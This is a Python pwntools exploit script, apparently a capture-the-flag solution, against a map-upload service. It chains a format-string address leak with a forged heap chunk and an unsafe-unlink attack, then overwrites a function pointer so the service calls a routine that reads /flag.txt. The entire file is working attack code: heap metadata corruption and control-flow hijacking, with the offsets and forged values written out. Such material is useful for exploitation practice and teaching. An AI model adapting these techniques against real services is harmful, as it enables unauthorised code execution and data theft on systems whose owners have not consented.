from pwn import *
import struct, re, sys

context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7777

def build_aeth_map(author_bytes=b"a", map_name=b"m"*0x2e, width=1, height=1, desc=b"DESC"):
    size = 0xE0
    buf = bytearray(b'\x00' * size)
    buf[0:4] = b'AETH'
    buf[6:8] = struct.pack('<H', width)
    buf[8:10] = struct.pack('<H', height)
    buf[0x10:0x10+min(len(map_name), 0x2f)] = map_name[:0x2f]
    buf[0x40:0x40+min(len(author_bytes), 0x1f)] = author_bytes[:0x1f]
    buf[0x60:0x60+min(len(desc), 0x7f)] = desc[:0x7f]
    return bytes(buf)

r = remote(HOST, PORT)
r.recvuntil(b"> ")

def upload(author=b"plain"):
    raw = build_aeth_map(author)
    r.send(b"UPLOAD %d\n" % len(raw))
    r.send(raw)
    data = r.recvuntil(b"> ", timeout=3)
    mid = int(re.search(rb"map (\d+) stored", data).group(1))
    return mid, data

def show(mid):
    r.send(b"SHOW %d\n" % mid)
    data = r.recvuntil(b"> ", timeout=3)
    m = re.search(rb"scroll=(0x[0-9a-f]+) wall=(0x[0-9a-f]+) scribe=(0x[0-9a-f]+|\(nil\))", data)
    vals = []
    for x in m.groups():
        vals.append(int(x, 16) if x != b"(nil)" else 0)
    return tuple(vals)

def release(mid):
    r.send(b"RELEASE %d\n" % mid)
    return r.recvuntil(b"> ", timeout=3)

def scribe(mid):
    r.send(b"SCRIBE %d\n" % mid)
    data = r.recvuntil(b"> ", timeout=3)
    m = re.search(rb"scribe=(0x[0-9a-f]+)", data)
    return (int(m.group(1), 16) if m else None), data

def patch(mid, data, n=None):
    if n is None:
        n = len(data)
    r.send(b"PATCH %d %d\n" % (mid, n))
    r.send(data)
    return r.recvuntil(b"> ", timeout=3)

def seal(mid):
    r.send(b"SEAL %d\n" % mid)
    return r.recvuntil(b"> ", timeout=3)

# --- Step 1: leak husk_ritual address via format-string in author_name ---
fmt = b"%1$p.%2$p.%3$p.%4$p".ljust(0x1f, b'\x00')
leak_id, leak_data = upload(fmt)
m = re.search(rb"uploaded by 0x[0-9a-f]+\.0x[0-9a-f]+\.0x[0-9a-f]+\.(0x[0-9a-f]+)", leak_data)
husk_ritual = int(m.group(1), 16)
log.success("husk_ritual leaked at %#x" % husk_ritual)

# --- Step 2: upload target map, leak scroll/wall ---
mid, _ = upload(b"target")
scroll_ptr, wall_ptr, _ = show(mid)
log.info("scroll=%#x wall=%#x (diff=%#x)" % (scroll_ptr, wall_ptr, wall_ptr - scroll_ptr))

SCROLL_SIZE = 0x4f0
wall_chunk_start = scroll_ptr + 0x500 - 0x10   # = wall_ptr - 0x10

# Forged previous chunk lives inside scroll's buffer.
# Keep F < 0x400 so the forged chunk is classified "small" (no fd_nextsize/bk_nextsize checks in unlink).
F = 0x300
Cp = wall_chunk_start - F
fd_val = Cp - 0x18   # == scroll_ptr - 0x8
bk_val = Cp - 0x10   # == scroll_ptr

log.info("C'=%#x F=%#x fd_val=%#x bk_val=%#x" % (Cp, F, fd_val, bk_val))

cp_off = Cp - scroll_ptr  # offset of forged chunk start within scroll buffer

buf = bytearray(b'A' * (SCROLL_SIZE + 8))
buf[cp_off+0x00:cp_off+0x08] = struct.pack('<Q', Cp)     # forged prev_size (self-ref, for fd/bk check)
buf[cp_off+0x08:cp_off+0x10] = struct.pack('<Q', F)      # forged size field (must match prevsize)
buf[cp_off+0x10:cp_off+0x18] = struct.pack('<Q', fd_val) # forged fd
buf[cp_off+0x18:cp_off+0x20] = struct.pack('<Q', bk_val) # forged bk
buf[0x4f0:0x4f8] = struct.pack('<Q', F)                  # wall's real prev_size field

resp = patch(mid, bytes(buf), n=SCROLL_SIZE + 8)
log.info("patch1: %r" % resp)

resp = release(mid)
log.info("release: %r" % resp)
if b"wall released" not in resp:
    log.failure("release failed/crashed")
    r.interactive()
    sys.exit(1)

# --- Step 3: trigger scribe allocation to land inside scroll's buffer ---
scribe_ptr, sresp = scribe(mid)
log.info("scribe resp: %r" % sresp)
if scribe_ptr is None:
    log.failure("scribe creation failed/crashed")
    r.interactive()
    sys.exit(1)
log.info("scribe_ptr=%#x expected=%#x" % (scribe_ptr, Cp + 0x10))

if scribe_ptr != Cp + 0x10:
    log.warning("scribe did not land where expected, continuing anyway")

# --- Step 4: overwrite scribe->seal (at scribe_ptr+0x10) with husk_ritual via second PATCH ---
offset_in_scroll = scribe_ptr - scroll_ptr  # should be 0x20
seal_offset = offset_in_scroll + 0x10       # 0x30

buf2 = bytearray(b'B' * (seal_offset + 8))
buf2[seal_offset:seal_offset+8] = struct.pack('<Q', husk_ritual)
resp = patch(mid, bytes(buf2))
log.info("patch2: %r" % resp)

# --- Step 5: trigger the seal -> husk_ritual() -> system("cat /flag.txt") ---
resp = seal(mid)
log.info("seal resp: %r" % resp)

flag_match = re.search(rb"[A-Za-z0-9_]*\{[^\n}]*\}", resp)
if flag_match:
    log.success("FLAG: %s" % flag_match.group(0).decode())
else:
    log.warning("No flag pattern found in seal response; raw output above.")

r.close()
